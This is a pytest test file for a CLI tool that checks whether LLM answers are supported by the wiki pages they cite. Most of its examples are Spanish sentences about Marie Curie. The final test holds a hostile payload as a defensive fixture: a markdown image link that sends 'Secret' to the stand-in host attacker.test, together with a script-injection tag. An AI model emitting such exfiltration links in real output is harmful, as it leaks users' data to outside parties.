"""`sb ask` checks that the answer is supported by the pages, not only that its citations are real:
every sentence with facts in it must find its numbers, names and key words in those pages."""

import pytest
from conftest import FakeLLM, add_source

from esbi_cli.ask.answer import answer_question
from esbi_cli.ask.faithful import check_answer

CURIE = (
    "# Marie Curie\n\nMarie Curie nació en Varsovia en 1867. Ganó el Premio Nobel de Física "
    "en 1903 junto con Pierre Curie y Henri Becquerel por sus investigaciones sobre la "
    "radiactividad. Descubrió los elementos polonio y radio. Su laboratorio medía 3.5 metros."
)
RADIO = "# Radio\n\nEl radio es un elemento químico muy radiactivo descubierto en París."
QUESTION = "¿Qué logró Marie Curie con el radio?"


def plan(answer, cited=("Marie Curie",)):
    return {
        "title": "Qué logró Marie Curie",
        "one_liner": "Resumen de los logros de Marie Curie.",
        "answer": answer,
        "cited_pages": list(cited),
    }


def ask(vault, answer, cited=("Marie Curie",), question=QUESTION):
    add_source(vault, "Marie Curie", body=CURIE)
    add_source(vault, "Radio", body=RADIO)
    return answer_question(vault, FakeLLM(plan(answer, cited)), question)


def test_an_answer_whose_sentences_are_in_the_pages_is_left_alone(vault):
    text = (
        "Marie Curie ganó el Premio Nobel de Física en 1903 por sus investigaciones sobre "
        "la radiactividad. Descubrió el polonio y el radio. [[Marie Curie]]"
    )

    answer = ask(vault, text)

    assert answer.grounded and answer.unsupported == []
    assert "⚠" not in answer.text and answer.text == text


def test_a_paraphrase_with_other_accents_plurals_and_endings_is_not_flagged(vault):
    answer = ask(
        vault,
        "Su investigación sobre la radiactividad le dio el PREMIO NOBEL de fisica. [[Marie Curie]]",
    )

    assert answer.unsupported == []


def test_a_sentence_with_a_name_the_pages_never_mention_is_marked_and_listed(vault):
    answer = ask(
        vault,
        "Descubrió el polonio y el radio. Fundó el Instituto Pasteur en Lyon. [[Marie Curie]]",
    )

    assert answer.grounded and answer.citations == ["Marie Curie"]
    assert [u.sentence for u in answer.unsupported] == ["Fundó el Instituto Pasteur en Lyon."]
    assert answer.unsupported[0].missing == ["Fundó", "Instituto", "Pasteur", "Lyon"]
    assert "Fundó el Instituto Pasteur en Lyon. ⚠" in answer.text
    assert "el radio. Fundó" in answer.text  # the supported sentence gets no mark
    assert answer.text.rstrip().endswith(
        "No encontrado en las páginas citadas: Fundó, Instituto, Pasteur, Lyon"
    )


def test_a_number_that_is_not_in_the_pages_is_flagged_even_when_every_word_is(vault):
    answer = ask(
        vault,
        "Descubrió el polonio y el radio. Ganó el Premio Nobel de Física en 1911. [[Marie Curie]]",
    )

    assert [u.missing for u in answer.unsupported] == [["1911"]]


def test_a_sentence_with_no_names_or_numbers_fails_when_half_its_key_words_are_missing(vault):
    answer = ask(
        vault,
        "Descubrió el polonio y el radio. Estudió ingeniería aeroespacial avanzada. "
        "Descubrió el radio y el elemento polonio gracias a sus investigaciones, según algunos "
        "historiadores famosos. [[Marie Curie]]",
    )

    # all four key words of the 2nd sentence are missing: flagged; one of six in the 3rd: not
    assert [u.sentence for u in answer.unsupported] == ["Estudió ingeniería aeroespacial avanzada."]


def test_one_unknown_ordinary_word_is_a_synonym_not_an_invention(vault):
    answer = ask(vault, "Estudió radiactividad. Sin embargo, estudió radio. [[Marie Curie]]")

    assert answer.unsupported == []  # "estudió" is not in the page, but it is the only one


@pytest.mark.parametrize(
    "language, sentence",
    [
        ("es", "No se menciona quién financió sus investigaciones en el texto."),
        ("es", "No hay información sobre su laboratorio de Varsovia."),
        ("en", "The pages do not mention who financed her laboratory in Warsaw."),
        ("en", "There is no information about her laboratory in Warsaw."),
    ],
)
def test_saying_the_pages_do_not_have_the_answer_is_not_a_claim_to_check(vault, language, sentence):
    vault.language = language
    add_source(
        vault,
        "Marie Curie",
        body=CURIE if language == "es" else "# Marie Curie\n\nShe won a prize.",
    )
    llm = FakeLLM(plan(f"{sentence} [[Marie Curie]]"))

    answer = answer_question(vault, llm, "¿Quién financió a Marie Curie?")

    assert answer.grounded and answer.unsupported == []


def test_a_list_is_checked_item_by_item_without_its_bullets_or_numbering(vault):
    answer = ask(
        vault,
        "1. Descubrió el polonio.\n2. Descubrió el radio.\n- Fundó el Instituto Pasteur.\n[[Marie Curie]]",
    )

    assert [u.sentence for u in answer.unsupported] == ["- Fundó el Instituto Pasteur."]


def test_the_same_number_written_another_way_is_the_same_number(vault):
    answer = ask(vault, "Su laboratorio medía 3,5 metros en la ciudad de 1.868.")

    assert [u.missing for u in answer.unsupported] == [
        ["ciudad", "1868"]
    ]  # 3,5 is 3.5; 1.868 is 1868


def test_most_of_the_answer_unsupported_is_refused_like_an_uncited_answer(vault):
    answer = ask(
        vault,
        "Fundó el Instituto Pasteur en Lyon. Ganó el Premio Nobel de Física en 1911. "
        "Descubrió el polonio y el radio. [[Marie Curie]]",
    )

    assert answer.grounded is False and answer.citations == []
    assert answer.text == "No encuentro nada sobre esto en la wiki."
    assert len(answer.unsupported) == 2  # kept: the maintainer can see why it was refused


def test_an_answer_of_one_unsupported_sentence_is_refused_too(vault):
    answer = ask(vault, "Fundó el Instituto Pasteur en Lyon. [[Marie Curie]]")

    assert answer.grounded is False


def test_exactly_half_unsupported_is_marked_not_refused(vault):
    answer = ask(vault, "Descubrió el radio. Fundó el Instituto Pasteur en Lyon. [[Marie Curie]]")

    assert answer.grounded and len(answer.unsupported) == 1


def test_a_page_given_as_context_but_not_cited_supports_a_sentence(vault):
    answer = ask(vault, "El radio, descubierto en París, es muy radiactivo. [[Marie Curie]]")

    assert answer.unsupported == []


def test_a_cited_page_the_model_was_not_shown_still_supports_a_sentence(vault):
    add_source(vault, "Marie Curie", body=CURIE)
    add_source(vault, "Otra", body="# Otra\n\nTexto cualquiera sobre pájaros migratorios.")
    llm = FakeLLM(plan("Nació en Varsovia en 1867. [[Marie Curie]]", ("Otra",)))

    answer = answer_question(vault, llm, "¿Qué dice el texto sobre pájaros migratorios?")

    assert answer.retrieved == ["Otra"] and answer.unsupported == []


def test_short_or_empty_sentences_have_nothing_to_check(vault):
    answer = ask(vault, "Sí. Descubrió el polonio y el radio. [[Marie Curie]]")

    assert answer.unsupported == []


def test_links_are_citations_not_claims(vault):
    answer = ask(vault, "Descubrió el polonio y el radio ([[Marie Curie]] y [[Radio]]).")

    assert answer.unsupported == []


def test_an_english_wiki_gets_the_footer_in_english(vault):
    vault.language = "en"
    add_source(
        vault, "Marie Curie", body="# Marie Curie\n\nMarie Curie won the Nobel Prize in 1903."
    )
    llm = FakeLLM(
        plan("Marie Curie won the Nobel Prize in 1903. She founded the Pasteur Institute in Lyon.")
    )

    answer = answer_question(vault, llm, "What did Marie Curie achieve?")

    assert answer.text.rstrip().endswith(
        "Not found in the cited pages: founded, Pasteur, Institute, Lyon"
    )


def test_pages_in_another_language_than_the_answer_cannot_be_compared_so_they_are_not_checked(
    vault,
):
    english = "# Marie Curie\n\nShe won the Nobel Prize in 1903 and the second one in 1911, and she was the first woman to do so."
    add_source(vault, "Marie Curie", body=english)

    answer = answer_question(
        vault, FakeLLM(plan("Ganó dos premios Nobel, en 1903 y en 1911.")), "¿Qué ganó Marie Curie?"
    )

    assert answer.grounded and answer.unsupported == []


def test_a_cloud_model_is_checked_against_the_public_text_only(vault):
    add_source(vault, "Marie Curie", body=CURIE)
    mail = add_source(vault, "Correo", body="# Correo\n\nEl Instituto Pasteur de Lyon financió.")
    mail.meta["kind"] = "email"
    vault.write_page(mail)  # an email page: never evidence for a cloud model
    llm = FakeLLM(
        plan("Fundó el Instituto Pasteur en Lyon. [[Marie Curie]]", ("Marie Curie", "Correo"))
    )
    llm.sends_text_out = True

    answer = answer_question(vault, llm, "¿Qué fundó Marie Curie?")

    assert answer.unsupported and "Pasteur" in answer.unsupported[0].missing


def test_a_cloud_model_is_not_given_credit_for_text_that_came_from_email(vault):
    from test_privacy import SECRET, cloud, seed_email_wiki

    seed_email_wiki(vault)
    claim = {
        "title": "Qué es un arnés",
        "one_liner": "Explicación breve del arnés.",
        "answer": "Capa de código del agente. El contrato con Acme vence en marzo. [[Arnés de agente]]",
        "cited_pages": ["Arnés de agente"],
    }
    question = "¿Qué es el arnés de agente y el contrato Acme?"

    remote = answer_question(vault, cloud(claim), question)
    local = answer_question(vault, FakeLLM(claim), question)

    assert SECRET and [u.sentence for u in remote.unsupported] == [
        "El contrato con Acme vence en marzo."
    ]  # the model never saw it, so it cannot be backed by it
    assert local.unsupported == []  # a local model did see the email part of the page


@pytest.mark.parametrize(
    "sentence, evidence",
    [
        ("Su investigación.", "Sus investigaciones"),
        ("Descubrimientos radiactivos.", "El descubrimiento radiactivo"),
        ("Constructed buildings.", "The construction of a building"),
        ("Ingeniería.", "ingenierias"),
    ],
)
def test_endings_do_not_make_two_forms_of_the_same_word_different(sentence, evidence):
    assert check_answer(sentence, [evidence]) == ([], 1)


@pytest.mark.parametrize(
    "sentence, missing",
    [
        ("Nació en Varsovia en 1867.", []),
        ("Nació en Cracovia en 1867.", ["Cracovia"]),
        ("Nació en Varsovia en 1868.", ["1868"]),
        ("Ganó el 50% de los premios.", ["50"]),
    ],
)
def test_the_checker_reports_exactly_which_words_are_missing(sentence, missing):
    found, _ = check_answer(sentence, [CURIE])

    assert [m for u in found for m in u.missing] == missing


def test_the_check_can_be_switched_off_in_the_call(vault):
    add_source(vault, "Marie Curie", body=CURIE)
    llm = FakeLLM(plan("Fundó el Instituto Pasteur en Lyon. [[Marie Curie]]"))

    answer = answer_question(vault, llm, QUESTION, check_support=False)

    assert answer.grounded and answer.unsupported == [] and "⚠" not in answer.text


def test_check_answers_is_on_by_default_and_off_with_the_setting(config_file):
    from esbi_cli.config import load_config, reset_loaded

    assert load_config(config_file).check_answers is True
    config_file.write_text(
        config_file.read_text(encoding="utf-8").replace(
            "[run]\n", "[run]\ncheck_answers = false\n"
        ),
        encoding="utf-8",
    )
    reset_loaded()

    assert load_config(config_file).check_answers is False


def test_sb_ask_obeys_check_answers_false(vault, config_file, monkeypatch):
    from typer.testing import CliRunner

    from esbi_cli import cli

    add_source(vault, "Marie Curie", body=CURIE)
    config_file.write_text(
        config_file.read_text(encoding="utf-8").replace(
            "[run]\n", "[run]\ncheck_answers = false\n"
        ),
        encoding="utf-8",
    )
    monkeypatch.setattr(
        cli,
        "make_llm",
        lambda _cfg: FakeLLM(plan("Fundó el Instituto Pasteur en Lyon. [[Marie Curie]]")),
    )

    result = CliRunner().invoke(cli.app, ["ask", QUESTION, "--config", str(config_file)])

    assert result.exit_code == 0 and "Pasteur" in result.stdout and "⚠" not in result.stdout


def test_a_hostile_answer_full_of_unclosed_links_is_checked_in_linear_time():
    import time

    started = time.monotonic()
    check_answer("[[ " * 30_000, [CURIE])

    assert time.monotonic() - started < 2


def test_an_answer_that_is_only_scrubbed_hostile_markup_is_refused(vault):
    answer = ask(
        vault,
        "![diagram](https://attacker.test/c?d=Secret) <script>alert(1)</script> [[Marie Curie]]",
    )

    assert answer.grounded is False
